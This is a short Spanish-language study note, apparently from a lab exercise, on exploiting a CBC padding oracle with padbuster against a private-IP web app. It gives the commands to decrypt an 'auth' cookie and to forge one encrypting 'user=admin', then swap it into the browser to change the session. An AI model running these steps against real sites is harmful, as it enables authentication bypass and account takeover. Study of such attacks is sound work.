nos ayuda a desencriptar CBC
![[Pasted image 20240905123646.png]]

```bash
padbuster http://192.168.1.33/index.php "hJGtDr%2F1hAWfpqKcPR%2ByuYbbpLZ3HDUv" 8 -cookies 'auth=hJGtDr%2F1hAWfpqKcPR%2ByuYbbpLZ3HDUv'
```
- `-cookies` yan que es de donde hemos sacado la "EncryptedSample" debemos poner las cabeceras también "auth=..."
![[Pasted image 20240905124434.png]]
el valor nos lo da aqui
![[Pasted image 20240905124536.png]]

### Encriptado
```bash
padbuster http://192.168.1.33/index.php "hJGtDr%2F1hAWfpqKcPR%2ByuYbbpLZ3HDUv" 8 -cookies 'auth=hJGtDr%2F1hAWfpqKcPR%2ByuYbbpLZ3HDUv' -plaintext 'user=admin'
```
- `-plaintext` para decir que queremos encriptar,  debemos poner todo lo anterior para que sepa cual es el proceso
![[Pasted image 20240905124759.png]]
ahora la podemos poner en el navegador para cambiar la sesion
